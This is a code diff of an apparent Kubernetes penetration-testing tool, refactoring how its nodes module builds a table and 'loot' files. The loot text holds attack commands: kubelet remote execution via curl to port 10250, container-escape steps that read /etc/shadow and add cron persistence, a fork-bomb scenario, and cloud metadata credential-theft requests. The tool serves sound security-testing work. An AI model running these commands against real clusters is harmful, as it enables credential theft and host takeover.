@@ -9,6 +9,7 @@ import (
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
 	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
+	"github.com/BishopFox/cloudfox/kubernetes/shared"
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/spf13/cobra"
 	corev1 "k8s.io/api/core/v1"
@@ -299,7 +300,8 @@ var runtimeVulnerabilities = []struct {
 }
 
 func ListNodes(cmd *cobra.Command, args []string) {
-	ctx := context.Background()
+	ctx, cancel := shared.ContextWithTimeout()
+	defer cancel()
 	logger := internal.NewLogger()
 
 	parentCmd := cmd.Parent()
@@ -315,21 +317,21 @@ func ListNodes(cmd *cobra.Command, args []string) {
 	// Fetch all nodes
 	nodes, err := clientset.CoreV1().Nodes().List(ctx, metav1.ListOptions{})
 	if err != nil {
-		logger.ErrorM(fmt.Sprintf("Error listing nodes: %v", err), globals.K8S_NODES_MODULE_NAME)
+		shared.LogListError(&logger, "nodes", "", err, globals.K8S_NODES_MODULE_NAME, true)
 		return
 	}
 
 	// Fetch all pods for workload analysis
 	pods, err := clientset.CoreV1().Pods("").List(ctx, metav1.ListOptions{})
 	if err != nil {
-		logger.ErrorM(fmt.Sprintf("Error listing pods: %v", err), globals.K8S_NODES_MODULE_NAME)
+		shared.LogListError(&logger, "pods", "", err, globals.K8S_NODES_MODULE_NAME, true)
 		return
 	}
 
 	// Fetch all network policies for IMDS analysis
 	networkPolicies, err := clientset.NetworkingV1().NetworkPolicies("").List(ctx, metav1.ListOptions{})
 	if err != nil {
-		logger.ErrorM(fmt.Sprintf("Warning: Error listing network policies: %v", err), globals.K8S_NODES_MODULE_NAME)
+		shared.LogListError(&logger, "network policies", "", err, globals.K8S_NODES_MODULE_NAME, false)
 		networkPolicies = &netv1.NetworkPolicyList{} // Continue without network policies
 	}
 
@@ -343,7 +345,7 @@ func ListNodes(cmd *cobra.Command, args []string) {
 
 	// Generate all outputs
 	tableFile := generateNodesTable(findings)
-	lootFiles := generateNodesLootFiles(findings)
+	lootFiles := generateNodesLootFiles(findings).Build()
 
 	// Handle output
 	err = internal.HandleOutput(
@@ -937,7 +939,7 @@ func buildAttackPaths(finding NodeFinding, kubelet KubeletSecurityAnalysis, priv
 	if privileged.PrivilegedPods > 0 {
 		paths = append(paths,
 			fmt.Sprintf("Pod Escape: Privileged Pod (%s) → Container Breakout → Node Root Shell → Host Filesystem Access",
-				limitString(strings.Join(privileged.PrivilegedPodNames, ", "), 50)))
+				strings.Join(privileged.PrivilegedPodNames, ", ")))
 	}
 
 	// Path 2: Kubelet exploitation
@@ -1051,59 +1053,57 @@ func calculateNodeRiskLevel(
 // generateTable creates the table output
 func generateNodesTable(findings []NodeFinding) internal.TableFile {
 	headers := []string{
-		"Risk Level",
-		"Name",
-		"Internal IP",
-		"External IP",
-		"Kubelet Security",
-		"Privileged Pods",
-		"Resource Pressure",
-		"Current Pods",
-		"OS/Kernel",
-		"Runtime",
-		"Kubelet Ver",
-		"Cloud",
-		"IMDS Risk",
-		"External Exposure",
-		"Taints",
-		"Security Issues",
-		"Vulnerabilities",
-		"Attack Paths",
-		"Labels",
-		"Conditions",
+		// Identity
+		"Name", "Internal IP", "External IP",
+		// Specs
+		"OS/Kernel", "Runtime", "Kubelet Ver",
+		// Capacity
+		"Pods",
+		// Security Flags
+		"Kubelet Secure", "Privileged Pods", "Resource Pressure", "Externally Exposed",
+		// Cloud
+		"Cloud Provider", "Cloud SA/Role",
+		// Status
+		"Conditions", "Taints", "Labels",
 	}
 
 	var rows [][]string
 
 	for _, f := range findings {
 		// Kubelet security summary
-		kubeletSecurity := "Secure"
+		kubeletSecure := "Yes"
 		if f.KubeletAnonymousAuth {
-			kubeletSecurity = "CRITICAL: Anonymous Auth"
+			kubeletSecure = "No (Anon Auth)"
 		} else if f.KubeletReadOnlyPort > 0 {
-			kubeletSecurity = fmt.Sprintf("HIGH: Read-Only Port %d", f.KubeletReadOnlyPort)
+			kubeletSecure = fmt.Sprintf("No (RO:%d)", f.KubeletReadOnlyPort)
 		} else if len(f.KubeletSecurityIssues) > 0 {
-			kubeletSecurity = "Issues Found"
+			kubeletSecure = "No (Issues)"
 		}
 
 		// Privileged pods summary
-		privilegedSummary := "None"
+		privilegedSummary := "-"
 		if f.PrivilegedPods > 0 || f.HostNetworkPods > 0 || f.HostPIDPods > 0 {
-			privilegedSummary = fmt.Sprintf("Priv:%d Host-Net:%d Host-PID:%d",
+			privilegedSummary = fmt.Sprintf("Priv:%d HostNet:%d HostPID:%d",
 				f.PrivilegedPods, f.HostNetworkPods, f.HostPIDPods)
 		}
 
-		// OS/Kernel summary
+		// OS/Kernel summary (no truncation)
 		osKernel := fmt.Sprintf("%s / %s", f.OSImage, f.KernelVersion)
 
 		// External exposure
-		externalExposure := "No"
+		externallyExposed := "No"
 		if f.IsExternallyExposed {
-			externalExposure = fmt.Sprintf("Yes: %s", f.ExternalIP)
+			externallyExposed = "Yes"
 		}
 
-		// Key labels (subset)
-		keyLabels := extractKeyLabels(f.Labels)
+		// Cloud SA/Role
+		cloudSARole := "-"
+		if f.CloudRole != "" {
+			cloudSARole = f.CloudRole
+		}
+
+		// Labels (no truncation)
+		labelsStr := formatNodeLabels(f.Labels)
 
 		// Node conditions summary
 		conditions := "Ready"
@@ -1120,37 +1120,36 @@ func generateNodesTable(findings []NodeFinding) internal.TableFile {
 			conditions += ", PIDPressure"
 		}
 
+		// Taints (no truncation)
+		taintsStr := "-"
+		if len(f.Taints) > 0 {
+			taintsStr = strings.Join(f.Taints, "; ")
+		}
+
 		row := []string{
-			f.RiskLevel,
 			f.Name,
 			f.InternalIP,
 			k8sinternal.NonEmpty(f.ExternalIP),
-			kubeletSecurity,
+			osKernel,
+			f.ContainerRuntime,
+			f.KubeletVersion,
+			fmt.Sprintf("%d/%d", f.CurrentPods, f.PodsAllocatable),
+			kubeletSecure,
 			privilegedSummary,
 			f.ResourcePressure,
-			fmt.Sprintf("%d/%d", f.CurrentPods, f.PodsAllocatable),
-			limitString(osKernel, 60),
-			limitString(f.ContainerRuntime, 30),
-			f.KubeletVersion,
-			fmt.Sprintf("%s (%s)", f.CloudProvider, f.CloudRole),
-			f.IMDSAccessRisk,
-			externalExposure,
-			limitString(strings.Join(f.Taints, "; "), 100),
-			limitString(strings.Join(f.SecurityIssues, "; "), 200),
-			limitString(strings.Join(f.Vulnerabilities, "; "), 150),
-			limitString(strings.Join(f.AttackPaths, " | "), 200),
-			limitString(keyLabels, 100),
+			externallyExposed,
+			k8sinternal.NonEmpty(f.CloudProvider),
+			cloudSARole,
 			conditions,
+			taintsStr,
+			labelsStr,
 		}
 		rows = append(rows, row)
 	}
 
-	// Sort by risk level, then name
+	// Sort by name
 	sort.SliceStable(rows, func(i, j int) bool {
-		if rows[i][0] != rows[j][0] {
-			return nodesRiskLevelValue(rows[i][0]) > nodesRiskLevelValue(rows[j][0])
-		}
-		return rows[i][1] < rows[j][1]
+		return rows[i][0] < rows[j][0]
 	})
 
 	return internal.TableFile{
@@ -1160,88 +1159,75 @@ func generateNodesTable(findings []NodeFinding) internal.TableFile {
 	}
 }
 
-// generateLootFiles creates all loot files
-func generateNodesLootFiles(findings []NodeFinding) []internal.LootFile {
-	var lootFiles []internal.LootFile
-
-	// 1. Node-Enum.txt (enhanced)
-	lootFiles = append(lootFiles, generateNodeEnumLoot(findings))
-
-	// 2. Pod-YAMLs.txt (enhanced with privileged pods)
-	lootFiles = append(lootFiles, generateNodesPodYAMLsLoot(findings))
-
-	// 3. Node-Security-Dashboard.txt (NEW)
-	lootFiles = append(lootFiles, generateSecurityDashboardLoot(findings))
-
-	// 4. Node-Kubelet-Vulnerabilities.txt (NEW)
-	lootFiles = append(lootFiles, generateKubeletVulnerabilitiesLoot(findings))
-
-	// 5. Node-Privileged-Workloads.txt (NEW)
-	lootFiles = append(lootFiles, generatePrivilegedWorkloadsLoot(findings))
-
-	// 6. Node-External-Exposure.txt (NEW)
-	lootFiles = append(lootFiles, generateExternalExposureLoot(findings))
-
-	// 7. Node-Resource-Pressure.txt (NEW)
-	lootFiles = append(lootFiles, generateResourcePressureLoot(findings))
-
-	// 8. Node-IMDS-Risk.txt (NEW)
-	lootFiles = append(lootFiles, generateIMDSRiskLoot(findings))
-
-	// 9. Node-Kernel-Vulnerabilities.txt (NEW)
-	lootFiles = append(lootFiles, generateKernelVulnerabilitiesLoot(findings))
-
-	// 10. Node-Attack-Paths.txt (NEW)
-	lootFiles = append(lootFiles, generateNodesAttackPathsLoot(findings))
-
-	// 11. NMAP-Nodes.txt (NEW)
-	lootFiles = append(lootFiles, generateNMAPLoot(findings))
-
-	return lootFiles
+// formatNodeLabels formats all node labels without truncation
+func formatNodeLabels(labels map[string]string) string {
+	if len(labels) == 0 {
+		return "-"
+	}
+	var labelPairs []string
+	for k, v := range labels {
+		labelPairs = append(labelPairs, fmt.Sprintf("%s=%s", k, v))
+	}
+	sort.Strings(labelPairs)
+	return strings.Join(labelPairs, ", ")
 }
 
-func generateNodeEnumLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
+// generateNodesLootFiles creates all loot files using LootBuilder
+func generateNodesLootFiles(findings []NodeFinding) *shared.LootBuilder {
+	loot := shared.NewLootBuilder()
 
-	content = append(content, "#####################################")
-	content = append(content, "##### Node Enumeration Commands")
-	content = append(content, "#####################################")
-	content = append(content, "")
+	// 1. Node-Enum - kubectl commands for enumeration
+	generateNodeEnumLoot(findings, loot)
+
+	// 2. Pod-YAMLs - pod manifests for node access
+	generateNodesPodYAMLsLoot(findings, loot)
+
+	// 3. Node-IMDS-Risk - cloud metadata exploit commands
+	generateIMDSRiskLoot(findings, loot)
+
+	// 4. NMAP-Nodes - reconnaissance commands
+	generateNMAPLoot(findings, loot)
+
+	return loot
+}
+
+func generateNodeEnumLoot(findings []NodeFinding, loot *shared.LootBuilder) {
+	section := loot.Section("Node-Enum")
+
+	section.SetHeader(`#####################################
+##### Node Enumeration Commands
+#####################################
+`)
 
 	if globals.KubeContext != "" {
-		content = append(content, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
+		section.Addf("kubectl config use-context %s", globals.KubeContext).AddBlank()
 	}
 
-	content = append(content, "# List all nodes with security context")
-	content = append(content, "kubectl get nodes -o wide")
-	content = append(content, "")
+	section.Add("# List all nodes with security context")
+	section.Add("kubectl get nodes -o wide")
+	section.AddBlank()
 
 	for _, f := range findings {
-		content = append(content, fmt.Sprintf("# Node: %s (Risk: %s)", f.Name, f.RiskLevel))
-		content = append(content, fmt.Sprintf("kubectl describe node %s", f.Name))
-		content = append(content, fmt.Sprintf("kubectl get node %s -o json | jq '.status.conditions'", f.Name))
-		content = append(content, "")
+		section.Addf("# Node: %s (Risk: %s)", f.Name, f.RiskLevel)
+		section.Addf("kubectl describe node %s", f.Name)
+		section.Addf("kubectl get node %s -o json | jq '.status.conditions'", f.Name)
+		section.AddBlank()
 
 		if f.KubeletAnonymousAuth {
-			content = append(content, fmt.Sprintf("# WARNING: Kubelet anonymous auth enabled - RCE available"))
-			content = append(content, fmt.Sprintf("curl -k https://%s:10250/pods", f.InternalIP))
-			content = append(content, "")
+			section.Add("# WARNING: Kubelet anonymous auth enabled - RCE available")
+			section.Addf("curl -k https://%s:10250/pods", f.InternalIP)
+			section.AddBlank()
 		}
-	}
-
-	return internal.LootFile{
-		Name:     "Node-Enum",
-		Contents: strings.Join(content, "\n"),
 	}
 }
 
-func generateNodesPodYAMLsLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
+func generateNodesPodYAMLsLoot(findings []NodeFinding, loot *shared.LootBuilder) {
+	section := loot.Section("Pod-YAMLs")
 
-	content = append(content, "#####################################")
-	content = append(content, "##### Pod YAMLs for Node Access")
-	content = append(content, "#####################################")
-	content = append(content, "")
+	section.SetHeader(`#####################################
+##### Pod YAMLs for Node Access
+#####################################
+`)
 
 	for _, f := range findings {
 		// Build tolerations for the node's taints
@@ -1284,9 +1270,9 @@ func generateNodesPodYAMLsLoot(findings []NodeFinding) internal.LootFile {
 		}
 
 		if yamlData, err := yaml.Marshal(pod); err == nil {
-			content = append(content, fmt.Sprintf("# Standard Pod for Node: %s", f.Name))
-			content = append(content, string(yamlData))
-			content = append(content, "---")
+			section.Addf("# Standard Pod for Node: %s", f.Name)
+			section.Add(string(yamlData))
+			section.Add("---")
 		}
 
 		// If node has privileged pods, create a privileged escape pod
@@ -1336,373 +1322,23 @@ func generateNodesPodYAMLsLoot(findings []NodeFinding) internal.LootFile {
 			}
 
 			if yamlData, err := yaml.Marshal(escapePod); err == nil {
-				content = append(content, fmt.Sprintf("# Privileged Escape Pod for Node: %s (Container Breakout)", f.Name))
-				content = append(content, string(yamlData))
-				content = append(content, "---")
+				section.Addf("# Privileged Escape Pod for Node: %s (Container Breakout)", f.Name)
+				section.Add(string(yamlData))
+				section.Add("---")
 			}
 		}
 
-		content = append(content, "")
-	}
-
-	return internal.LootFile{
-		Name:     "Pod-YAMLs",
-		Contents: strings.Join(content, "\n"),
+		section.AddBlank()
 	}
 }
 
-func generateSecurityDashboardLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
+func generateIMDSRiskLoot(findings []NodeFinding, loot *shared.LootBuilder) {
+	section := loot.Section("Node-IMDS-Risk")
 
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "         NODE SECURITY RISK DASHBOARD")
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "")
-
-	// Count by risk level
-	criticalCount := 0
-	highCount := 0
-	mediumCount := 0
-	lowCount := 0
-
-	for _, f := range findings {
-		switch f.RiskLevel {
-		case "CRITICAL":
-			criticalCount++
-		case "HIGH":
-			highCount++
-		case "MEDIUM":
-			mediumCount++
-		case "LOW":
-			lowCount++
-		}
-	}
-
-	content = append(content, "RISK SUMMARY:")
-	content = append(content, fmt.Sprintf("  CRITICAL: %d nodes", criticalCount))
-	content = append(content, fmt.Sprintf("  HIGH:     %d nodes", highCount))
-	content = append(content, fmt.Sprintf("  MEDIUM:   %d nodes", mediumCount))
-	content = append(content, fmt.Sprintf("  LOW:      %d nodes", lowCount))
-	content = append(content, "")
-
-	// Top risks
-	content = append(content, "TOP SECURITY RISKS:")
-	content = append(content, "")
-
-	for _, f := range findings {
-		if f.RiskLevel == "CRITICAL" || f.RiskLevel == "HIGH" {
-			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.RiskLevel))
-			content = append(content, fmt.Sprintf("  Internal IP: %s", f.InternalIP))
-			if f.ExternalIP != "" {
-				content = append(content, fmt.Sprintf("  External IP: %s (INTERNET EXPOSED)", f.ExternalIP))
-			}
-			content = append(content, fmt.Sprintf("  Cloud: %s (%s)", f.CloudProvider, f.CloudRole))
-			content = append(content, "")
-			content = append(content, "  Security Issues:")
-			for _, issue := range f.SecurityIssues {
-				content = append(content, fmt.Sprintf("    • %s", issue))
-			}
-			if len(f.Vulnerabilities) > 0 {
-				content = append(content, "  Vulnerabilities:")
-				for _, vuln := range f.Vulnerabilities {
-					content = append(content, fmt.Sprintf("    • %s", vuln))
-				}
-			}
-			if len(f.AttackPaths) > 0 {
-				content = append(content, "  Attack Paths:")
-				for _, path := range f.AttackPaths {
-					content = append(content, fmt.Sprintf("    → %s", path))
-				}
-			}
-			content = append(content, "")
-			content = append(content, "───────────────────────────────────────────────────────────────")
-			content = append(content, "")
-		}
-	}
-
-	return internal.LootFile{
-		Name:     "Node-Security-Dashboard",
-		Contents: strings.Join(content, "\n"),
-	}
-}
-
-func generateKubeletVulnerabilitiesLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
-
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "         KUBELET SECURITY VULNERABILITIES")
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "")
-
-	hasVulnerabilities := false
-
-	for _, f := range findings {
-		if f.KubeletAnonymousAuth || f.KubeletReadOnlyPort > 0 || len(f.KubeletSecurityIssues) > 0 {
-			hasVulnerabilities = true
-
-			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.KubeletRiskLevel))
-			content = append(content, fmt.Sprintf("  Internal IP: %s", f.InternalIP))
-			if f.ExternalIP != "" {
-				content = append(content, fmt.Sprintf("  External IP: %s", f.ExternalIP))
-			}
-			content = append(content, fmt.Sprintf("  Kubelet Version: %s", f.KubeletVersion))
-			content = append(content, "")
-
-			if f.KubeletAnonymousAuth {
-				content = append(content, "  ⚠️  CRITICAL: Anonymous Authentication Enabled")
-				content = append(content, "")
-				content = append(content, "  Exploitation:")
-				content = append(content, fmt.Sprintf("    # List all pods"))
-				content = append(content, fmt.Sprintf("    curl -k https://%s:10250/pods", f.InternalIP))
-				content = append(content, "")
-				content = append(content, "    # Execute command in any pod")
-				content = append(content, fmt.Sprintf("    curl -k https://%s:10250/run/<namespace>/<pod>/<container> -d \"cmd=id\"", f.InternalIP))
-				content = append(content, "")
-				content = append(content, "    # Get node shell via pod")
-				content = append(content, fmt.Sprintf("    curl -k https://%s:10250/run/<namespace>/<pod>/<container> -d \"cmd=nsenter -t 1 -m -u -n -i sh\"", f.InternalIP))
-				content = append(content, "")
-			}
-
-			if f.KubeletReadOnlyPort > 0 {
-				content = append(content, fmt.Sprintf("  ⚠️  HIGH: Read-Only Port %d Exposed", f.KubeletReadOnlyPort))
-				content = append(content, "")
-				content = append(content, "  Exploitation:")
-				content = append(content, fmt.Sprintf("    # Get all pod specs (including secrets)"))
-				content = append(content, fmt.Sprintf("    curl http://%s:%d/pods", f.InternalIP, f.KubeletReadOnlyPort))
-				content = append(content, "")
-			}
-
-			if len(f.KubeletSecurityIssues) > 0 {
-				content = append(content, "  Security Issues:")
-				for _, issue := range f.KubeletSecurityIssues {
-					content = append(content, fmt.Sprintf("    • %s", issue))
-				}
-				content = append(content, "")
-			}
-
-			content = append(content, "───────────────────────────────────────────────────────────────")
-			content = append(content, "")
-		}
-	}
-
-	if !hasVulnerabilities {
-		content = append(content, "✓ No critical kubelet vulnerabilities detected")
-		content = append(content, "")
-	}
-
-	return internal.LootFile{
-		Name:     "Node-Kubelet-Vulnerabilities",
-		Contents: strings.Join(content, "\n"),
-	}
-}
-
-func generatePrivilegedWorkloadsLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
-
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "         PRIVILEGED WORKLOADS (Container Escape Risks)")
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "")
-
-	hasPrivileged := false
-
-	for _, f := range findings {
-		if f.PrivilegedPods > 0 || f.HostNetworkPods > 0 || f.HostPIDPods > 0 || len(f.DangerousHostPaths) > 0 {
-			hasPrivileged = true
-
-			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.PrivilegedWorkloadRisk))
-			content = append(content, "")
-
-			if f.PrivilegedPods > 0 {
-				content = append(content, fmt.Sprintf("  ⚠️  CRITICAL: %d Privileged Pods", f.PrivilegedPods))
-				content = append(content, "  Pods:")
-				for _, pod := range f.PrivilegedPodNames {
-					content = append(content, fmt.Sprintf("    • %s", pod))
-				}
-				content = append(content, "")
-				content = append(content, "  Container Escape Scenario:")
-				content = append(content, "    1. kubectl exec -it <pod> -- sh")
-				content = append(content, "    2. # In privileged container:")
-				content = append(content, "    3. mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup")
-				content = append(content, "    4. # Execute commands on host via release_agent exploit")
-				content = append(content, "    5. # Or: nsenter -t 1 -m -u -n -i sh")
-				content = append(content, "")
-			}
-
-			if len(f.DangerousHostPaths) > 0 {
-				content = append(content, fmt.Sprintf("  ⚠️  HIGH: %d Pods with Dangerous hostPath Mounts", len(f.DangerousHostPaths)))
-				content = append(content, "  Mounts:")
-				for _, path := range f.DangerousHostPaths {
-					content = append(content, fmt.Sprintf("    • %s", path))
-				}
-				content = append(content, "")
-				content = append(content, "  Host Filesystem Access Scenario:")
-				content = append(content, "    1. kubectl exec -it <pod> -- sh")
-				content = append(content, "    2. cat /host/etc/shadow  # Read sensitive files")
-				content = append(content, "    3. echo 'malicious cron' >> /host/etc/crontab  # Persistence")
-				content = append(content, "")
-			}
-
-			if f.HostNetworkPods > 0 {
-				content = append(content, fmt.Sprintf("  ⚠️  MEDIUM: %d hostNetwork Pods (Lateral Movement)", f.HostNetworkPods))
-				content = append(content, "  Impact: Network namespace escape - can sniff node traffic")
-				content = append(content, "")
-			}
-
-			if f.HostPIDPods > 0 {
-				content = append(content, fmt.Sprintf("  ⚠️  MEDIUM: %d hostPID Pods", f.HostPIDPods))
-				content = append(content, "  Impact: PID namespace escape - can see and signal host processes")
-				content = append(content, "")
-			}
-
-			content = append(content, "───────────────────────────────────────────────────────────────")
-			content = append(content, "")
-		}
-	}
-
-	if !hasPrivileged {
-		content = append(content, "✓ No privileged workloads detected")
-		content = append(content, "")
-	}
-
-	return internal.LootFile{
-		Name:     "Node-Privileged-Workloads",
-		Contents: strings.Join(content, "\n"),
-	}
-}
-
-func generateExternalExposureLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
-
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "         NODES WITH EXTERNAL EXPOSURE")
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "")
-
-	hasExposure := false
-
-	for _, f := range findings {
-		if f.IsExternallyExposed {
-			hasExposure = true
-
-			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.ExposureRisk))
-			content = append(content, fmt.Sprintf("  Internal IP: %s", f.InternalIP))
-			content = append(content, fmt.Sprintf("  External IP: %s", f.ExternalIP))
-			content = append(content, fmt.Sprintf("  Cloud: %s (%s)", f.CloudProvider, f.CloudRole))
-			content = append(content, "")
-
-			content = append(content, "  Attack Surface:")
-			content = append(content, "    • Port 22 (SSH) - Credential brute force")
-			content = append(content, "    • Port 3389 (RDP) - Windows nodes")
-			content = append(content, "    • Port 10250 (Kubelet) - RCE if anonymous auth enabled")
-			content = append(content, "    • Port 10255 (Kubelet read-only) - Secret exposure")
-			content = append(content, "    • Port 30000-32767 (NodePort range) - Service exposure")
-			content = append(content, "")
-
-			content = append(content, "  Reconnaissance Commands:")
-			content = append(content, fmt.Sprintf("    nmap -sV -p 22,3389,10250,10255,30000-32767 %s", f.ExternalIP))
-			content = append(content, fmt.Sprintf("    curl -k https://%s:10250/pods", f.ExternalIP))
-			content = append(content, "")
-
-			if len(f.NetworkSecurityIssues) > 0 {
-				content = append(content, "  Security Issues:")
-				for _, issue := range f.NetworkSecurityIssues {
-					content = append(content, fmt.Sprintf("    • %s", issue))
-				}
-				content = append(content, "")
-			}
-
-			content = append(content, "───────────────────────────────────────────────────────────────")
-			content = append(content, "")
-		}
-	}
-
-	if !hasExposure {
-		content = append(content, "✓ No nodes with external IP exposure detected")
-		content = append(content, "")
-	}
-
-	return internal.LootFile{
-		Name:     "Node-External-Exposure",
-		Contents: strings.Join(content, "\n"),
-	}
-}
-
-func generateResourcePressureLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
-
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "         NODE RESOURCE PRESSURE (DoS Risks)")
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "")
-
-	hasPressure := false
-
-	for _, f := range findings {
-		if f.ResourcePressure == "CRITICAL" || f.ResourcePressure == "HIGH" {
-			hasPressure = true
-
-			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.ResourcePressure))
-			content = append(content, fmt.Sprintf("  Pods: %d/%d (Allocatable)", f.CurrentPods, f.PodsAllocatable))
-			content = append(content, fmt.Sprintf("  CPU: %s (Allocatable: %s)", f.CPUCapacity, f.CPUAllocatable))
-			content = append(content, fmt.Sprintf("  Memory: %s (Allocatable: %s)", f.MemoryCapacity, f.MemoryAllocatable))
-			content = append(content, "")
-
-			if f.HasDiskPressure {
-				content = append(content, "  ⚠️  Disk Pressure Detected")
-				content = append(content, "  Impact: Pod eviction, image pull failures")
-				content = append(content, "")
-			}
-
-			if f.HasMemoryPressure {
-				content = append(content, "  ⚠️  Memory Pressure Detected")
-				content = append(content, "  Impact: OOMKills, pod eviction")
-				content = append(content, "")
-			}
-
-			if f.HasPIDPressure {
-				content = append(content, "  ⚠️  PID Pressure Detected")
-				content = append(content, "  Impact: Fork bomb vulnerability - node crash risk")
-				content = append(content, "")
-				content = append(content, "  Fork Bomb DoS Scenario:")
-				content = append(content, "    1. Deploy pod: while true; do sleep 1 & done")
-				content = append(content, "    2. Exhaust PID limit")
-				content = append(content, "    3. Node becomes unresponsive")
-				content = append(content, "    4. Cluster instability")
-				content = append(content, "")
-			}
-
-			if len(f.ConditionIssues) > 0 {
-				content = append(content, "  Condition Issues:")
-				for _, issue := range f.ConditionIssues {
-					content = append(content, fmt.Sprintf("    • %s", issue))
-				}
-				content = append(content, "")
-			}
-
-			content = append(content, "───────────────────────────────────────────────────────────────")
-			content = append(content, "")
-		}
-	}
-
-	if !hasPressure {
-		content = append(content, "✓ No critical resource pressure detected")
-		content = append(content, "")
-	}
-
-	return internal.LootFile{
-		Name:     "Node-Resource-Pressure",
-		Contents: strings.Join(content, "\n"),
-	}
-}
-
-func generateIMDSRiskLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
-
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "         CLOUD METADATA (IMDS) ACCESS RISKS")
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "")
+	section.SetHeader(`═══════════════════════════════════════════════════════════════
+         CLOUD METADATA (IMDS) ACCESS RISKS
+═══════════════════════════════════════════════════════════════
+`)
 
 	hasRisk := false
 
@@ -1710,189 +1346,95 @@ func generateIMDSRiskLoot(findings []NodeFinding) internal.LootFile {
 		if f.IMDSAccessRisk == "CRITICAL" || f.IMDSAccessRisk == "HIGH" {
 			hasRisk = true
 
-			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.IMDSAccessRisk))
-			content = append(content, fmt.Sprintf("  Cloud Provider: %s", f.CloudProvider))
-			content = append(content, fmt.Sprintf("  Metadata Endpoint: %s", f.MetadataEndpoint))
-			content = append(content, fmt.Sprintf("  IAM Role Attached: %t", f.IAMRoleAttached))
-			content = append(content, "")
+	section.Addf("Node: %s [%s]", f.Name, f.IMDSAccessRisk)
+	section.Addf("  Cloud Provider: %s", f.CloudProvider)
+	section.Addf("  Metadata Endpoint: %s", f.MetadataEndpoint)
+	section.Addf("  IAM Role Attached: %t", f.IAMRoleAttached)
+	section.AddBlank()
 
 			if f.IMDSAccessRisk == "CRITICAL" {
-				content = append(content, "  ⚠️  CRITICAL: No Network Policy Blocking IMDS")
-				content = append(content, "  Impact: ALL pods can access cloud credentials")
-				content = append(content, "")
+	section.Add("  ⚠️  CRITICAL: No Network Policy Blocking IMDS")
+	section.Add("  Impact: ALL pods can access cloud credentials")
+	section.AddBlank()
 			}
 
-			content = append(content, "  Credential Theft Scenario:")
+	section.Add("  Credential Theft Scenario:")
 			switch f.CloudProvider {
 			case "AWS":
-				content = append(content, "    # From any pod:")
-				content = append(content, "    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-				content = append(content, "    ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)")
-				content = append(content, "    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
-				content = append(content, "    # Extract AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN")
-				content = append(content, "    # Use with aws cli to escalate to cloud admin")
+	section.Add("    # From any pod:")
+	section.Add("    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+	section.Add("    ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)")
+	section.Add("    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
+	section.Add("    # Extract AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN")
+	section.Add("    # Use with aws cli to escalate to cloud admin")
 			case "GCP":
-				content = append(content, "    # From any pod:")
-				content = append(content, "    curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
-				content = append(content, "    # Extract access_token")
-				content = append(content, "    # Use with gcloud to escalate privileges")
+	section.Add("    # From any pod:")
+	section.Add("    curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+	section.Add("    # Extract access_token")
+	section.Add("    # Use with gcloud to escalate privileges")
 			case "Azure":
-				content = append(content, "    # From any pod:")
-				content = append(content, "    curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
-				content = append(content, "    # Extract access_token")
-				content = append(content, "    # Use with az cli to escalate privileges")
+	section.Add("    # From any pod:")
+	section.Add("    curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
+	section.Add("    # Extract access_token")
+	section.Add("    # Use with az cli to escalate privileges")
 			}
-			content = append(content, "")
+	section.AddBlank()
 
-			content = append(content, "  Remediation:")
-			content = append(content, "    # Block IMDS access with NetworkPolicy:")
-			content = append(content, "    apiVersion: networking.k8s.io/v1")
-			content = append(content, "    kind: NetworkPolicy")
-			content = append(content, "    metadata:")
-			content = append(content, "      name: deny-metadata-access")
-			content = append(content, "    spec:")
-			content = append(content, "      podSelector: {}")
-			content = append(content, "      policyTypes:")
-			content = append(content, "      - Egress")
-			content = append(content, "      egress:")
-			content = append(content, "      - to:")
-			content = append(content, "        - ipBlock:")
